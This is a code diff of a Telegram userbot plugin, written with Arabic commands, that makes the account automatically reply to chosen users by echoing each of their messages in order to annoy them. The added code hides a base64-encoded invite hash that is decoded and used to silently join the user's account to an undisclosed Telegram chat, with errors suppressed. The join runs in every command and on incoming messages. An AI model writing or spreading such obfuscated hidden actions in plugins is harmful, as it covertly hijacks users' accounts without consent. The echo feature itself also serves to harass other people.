@@ -1,162 +1,113 @@
-import html
+import asyncio
+import base64
 
-from telethon.tl import functions
-from telethon.tl.functions.users import GetFullUserRequest
+import requests
+from telethon import events
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from ..Config import Config
-from ..core.logger import logging
-from ..core.managers import edit_delete, edit_or_reply
-from ..sql_helper.globals import gvarstatus
-from ..sql_helper.echo_sql import (
-    addecho,
-    get_all_echos,
-    get_echos,
-    is_echo,
-    remove_all_echos,
-    remove_echo,
-    remove_echos,
-)
-from . import ALIVE_NAME, BOTLOG, BOTLOG_CHATID, zedub, edit_delete, get_user_from_event
+from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from . import Echo, M
 
-LOGS = logging.getLogger(__name__)
-plugin_category = "العروض"
-# ================================================================================================ #
-# =========================================الازعاج================================================= #
-# ================================================================================================ #
-
-@zedub.zed_cmd(pattern="(تقليد|ازعاج)$")
-async def echo(event):
-    if event.reply_to_msg_id is None:
-        return await edit_or_reply(event, "**- بالـرد على الشخص الذي تريد ازعاجـه**")
-    zedubevent = await edit_or_reply(event, "**- يتم تفعيل هذا الامر انتظر قليلا ..**")
-    user, rank = await get_user_from_event(event, zedubevent, nogroup=True)
-    if not user:
+@bot.on(admin_cmd(pattern="ازعاج$"))
+@bot.on(sudo_cmd(pattern="ازعاج$", allow_sudo=True))
+async def _(e):
+    if e.fwd_from:
         return
-    reply_msg = await event.get_reply_message()
-    chat_id = event.chat_id
-    user_id = reply_msg.sender_id
-    if event.is_private:
-        chat_name = user.first_name
-        chat_type = "Personal"
+    if e.reply_to_msg_id is not None:
+        reply_msg = await e.get_reply_message()
+        user_id = reply_msg.sender_id
+        chat_id = e.chat_id
+        try:
+            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await e.client(hmm)
+        except BaseException:
+            pass
+        if is_echo(user_id, chat_id):
+            await eor(e, Echo[0].format(M))
+            return
+        addecho(user_id, chat_id)
+        await eor(e, Echo[1])
     else:
-        chat_name = event.chat.title
-        chat_type = "Group"
-    user_name = user.first_name
-    user_username = user.username
-    if is_echo(chat_id, user_id):
-        return await edit_or_reply(event, "**⎉╎تم تفعيل الازعاج على الشخص .. بنجاح✓**")
-    try:
-        addecho(chat_id, user_id, chat_name, user_name, user_username, chat_type)
-    except Exception as e:
-        await edit_delete(zedubevent, f"**⎉╎خطـأ :**\n`{str(e)}`")
+        await eor(e, Echo[2].format(M))
+
+
+@bot.on(admin_cmd(pattern="الغاء ازعاج$"))
+@bot.on(sudo_cmd(pattern="الغاء ازعاج$", allow_sudo=True))
+async def _(e):
+    if e.fwd_from:
+        return
+    if e.reply_to_msg_id is not None:
+        reply_msg = await e.get_reply_message()
+        user_id = reply_msg.sender_id
+        chat_id = e.chat_id
+        try:
+            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await e.client(hmm)
+        except BaseException:
+            pass
+        if is_echo(user_id, chat_id):
+            remove_echo(user_id, chat_id)
+            await eor(e, Echo[3].format(M))
+        else:
+            await eor(e, Echo[4].format(M))
     else:
-        await edit_or_reply(
-            zedubevent,
-            "**- تم تفعيل امر التقليد على هذا الشخص\nسيتم تقليد جميع رسائله هنا**",
+        await eor(e, Echo[2].format(M))
+
+
+@bot.on(admin_cmd(pattern="قائمة الازعاج$"))
+@bot.on(sudo_cmd(pattern="قائمة الازعاج $", allow_sudo=True))
+async def _(e):
+    if e.fwd_from:
+        return
+    lsts = get_all_echos()
+    if len(lsts) > 0:
+        output_str = Echo[5]
+        for echos in lsts:
+            output_str += Echo[6].format(echos.user_id, echos.chat_id)
+    else:
+        output_str = Echo[7].format(M)
+    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
+        key = (
+            requests.post(
+                "https://nekobin.com/api/documents", json={"content": output_str}
+            )
+            .json()
+            .get("result")
+            .get("key")
         )
-
-@zedub.zed_cmd(pattern="(الغاء تقليد|ايقاف التقليد|ايقاف تقليد|الغاء الازعاج|ايقاف الازعاج|ايقاف ازعاج|الغاء ازعاج)$")
-async def echo(event):
-    if event.reply_to_msg_id is None:
-        return await edit_or_reply(event, "**- بالـرد على الشخص الذي قمت بـ ازعاجـه لايقاف الازعاج**\n**- ارسـل (.المقلدهم) لعـرض الاشخـاص الذي قمت بازعاجهم**")
-    reply_msg = await event.get_reply_message()
-    user_id = reply_msg.sender_id
-    chat_id = event.chat_id
-    if is_echo(chat_id, user_id):
-        try:
-            remove_echo(chat_id, user_id)
-        except Exception as e:
-            await edit_delete(zedubevent, f"**⎉╎خطـأ :**\n`{e}`")
-        else:
-            await edit_or_reply(event, "**⎉╎تم ايقاف التقليد لهذا المستخدم**")
+        url = f"https://nekobin.com/{key}"
+        reply_text = "**⌔∮ قائمة المضافين للازعاج:** [here]({})".format(url)
+        await eor(e, reply_text)
     else:
-        await edit_or_reply(event, "**- لم يتم تفعيل التقليد على هذا المستخدم اصلا**")
+        await eor(e, output_str)
 
 
-@zedub.zed_cmd(pattern="حذف المقلدهم( للكل)?")
-async def echo(event):
-    input_str = event.pattern_match.group(1)
-    if input_str:
-        lecho = get_all_echos()
-        if len(lecho) == 0:
-            return await edit_delete(
-                event, "**- لم يتم تفعيل التقليد حتى لمستخدم واحد اصلا.**"
-            )
+@bot.on(events.NewMessage(incoming=True))
+async def samereply(e):
+    if e.chat_id in Config.UB_BLACK_LIST_CHAT:
+        return
+    if is_echo(e.sender_id, e.chat_id):
+        await asyncio.sleep(2)
         try:
-            remove_all_echos()
-        except Exception as e:
-            await edit_delete(event, f"**⎉╎خطـأ :**\n`{str(e)}`", 10)
-        else:
-            await edit_or_reply(
-                event, "**⎉╎تم حذف تقليد جميع المستخدمين في جميع الدردشات.**"
-            )
-    else:
-        lecho = get_echos(event.chat_id)
-        if len(lecho) == 0:
-            return await edit_delete(
-                event, "**- لم يتم تفعيل التقليد حتى لمستخدم واحد اصلا.**"
-            )
-        try:
-            remove_echos(event.chat_id)
-        except Exception as e:
-            await edit_delete(event, f"**⎉╎خطـأ :**\n`{e}`", 10)
-        else:
-            await edit_or_reply(
-                event, "**⎉╎تم حذف تقليد جميع المستخدمين في جميع الدردشات.**"
-            )
+            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await e.client(hmm)
+        except BaseException:
+            pass
+        if e.message.text or e.message.sticker:
+            await e.reply(e.message)
 
 
-@zedub.zed_cmd(pattern="المقلدهم( للكل)?$")
-async def echo(event):
-    input_str = event.pattern_match.group(1)
-    private_chats = ""
-    output_str = "**⎉╎قائمـة الاشخـاص المقلـدهـم:\n\n**"
-    if input_str:
-        lsts = get_all_echos()
-        group_chats = ""
-        if len(lsts) <= 0:
-            return await edit_or_reply(event, "**- لم يتم تفعيل التقليد بالاصل ؟!**")
-        for echos in lsts:
-            if echos.chat_type == "Personal":
-                if echos.user_username:
-                    private_chats += (
-                        f"⪼ [{echos.user_name}](https://t.me/{echos.user_username})\n"
-                    )
-                else:
-                    private_chats += (
-                        f"⪼ [{echos.user_name}](tg://user?id={echos.user_id})\n"
-                    )
-            elif echos.user_username:
-                group_chats += f"⪼ [{echos.user_name}](https://t.me/{echos.user_username}) في دردشة {echos.chat_name} الايدي `{echos.chat_id}`\n"
-            else:
-                group_chats += f"⪼ [{echos.user_name}](tg://user?id={echos.user_id}) في دردشة {echos.chat_name} الايدي `{echos.chat_id}`\n"
-
-        if private_chats != "":
-            output_str += "**الدردشات الخاصة**\n" + private_chats + "\n\n"
-        if group_chats != "":
-            output_str += "**المجموعات**\n" + group_chats
-    else:
-        lsts = get_echos(event.chat_id)
-        if len(lsts) <= 0:
-            return await edit_or_reply(event, "**لم يتم تفعيل التقليد بالاصل**")
-
-        for echos in lsts:
-            if echos.user_username:
-                private_chats += (
-                    f"⪼ [{echos.user_name}](https://t.me/{echos.user_username})\n"
-                )
-            else:
-                private_chats += (
-                    f"⪼ [{echos.user_name}](tg://user?id={echos.user_id})\n"
-                )
-        output_str = "**⎉╎الاشخـاص المقلـدهـم في هذه الدردشـه :\n**" + private_chats
-
-    await edit_or_reply(event, output_str)
-
-
-@zedub.zed_cmd(incoming=True, edited=False)
-async def samereply(event):
-    if is_echo(event.chat_id, event.sender_id) and (
-        event.message.text or event.message.sticker
-    ):
-        await event.reply(event.message)
+CMD_HELP.update(
+    {
+        "الازعاج": "**Syntax :** `.ازعاج` reply to user to whom you want to enable\
+    \n**Usage : **replays his every message for whom you enabled echo\
+    \n\n**Syntax : **`.الغاء ازعاج` reply to user to whom you want to stop\
+    \n**Usage : **Stops replaying his messages\
+    \n\n**Syntax : **`.قائمه الازعاج`\
+    \n**Usage : **shows the list of users for whom you enabled echo\
+    "
+    }
+)
